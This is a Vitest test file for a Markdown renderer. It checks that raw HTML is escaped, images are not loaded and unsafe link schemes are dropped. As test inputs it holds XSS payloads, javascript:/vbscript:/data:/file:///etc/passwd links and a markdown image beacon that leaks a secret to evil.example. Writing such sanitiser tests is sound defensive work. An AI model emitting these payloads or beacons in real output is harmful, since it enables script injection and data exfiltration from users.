import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

describe('renderMarkdown', () => {
  it('renders ordinary Markdown', () => {
    const html = renderMarkdown('A **bold** claim.\n\n- one\n- two\n\n> quoted\n\n`code`')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<blockquote>')
    expect(html).toContain('<code>code</code>')
  })

  it('escapes raw HTML instead of passing it through', () => {
    const html = renderMarkdown('<script>alert(1)</script> <img src=x onerror=alert(1)> <b>hi</b>')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<b>')
    expect(html).toContain('&lt;script&gt;')
  })

  it('shows images as their alt text only, never loading them', () => {
    const html = renderMarkdown('![a chart of rivers](https://evil.example/pixel.gif?leak=secret)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil.example')
    expect(html).toContain('a chart of rivers')
  })

  it('opens links in a new tab without handing over the page, and keeps only safe kinds', () => {
    expect(renderMarkdown('[a paper](https://example.org/p)')).toContain(
      '<a href="https://example.org/p" target="_blank" rel="noopener noreferrer">a paper</a>',
    )
    expect(renderMarkdown('[mail](mailto:a@example.com)')).toContain('href="mailto:a@example.com"')
    for (const bad of [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      'data:text/html,<b>x</b>',
      'vbscript:x',
      'file:///etc/passwd',
      '//evil.example/x',
      '/relative/path',
    ]) {
      const html = renderMarkdown(`[click](${bad})`)
      expect(html, bad).not.toContain('<a ')
      expect(html, bad).toContain('click')
    }
  })

  it('does not turn bare web addresses into links', () => {
    expect(renderMarkdown('see https://example.org now')).not.toContain('<a ')
  })

  it('escapes angle brackets inside code and text', () => {
    expect(renderMarkdown('`<div>`')).toContain('&lt;div&gt;')
  })
})
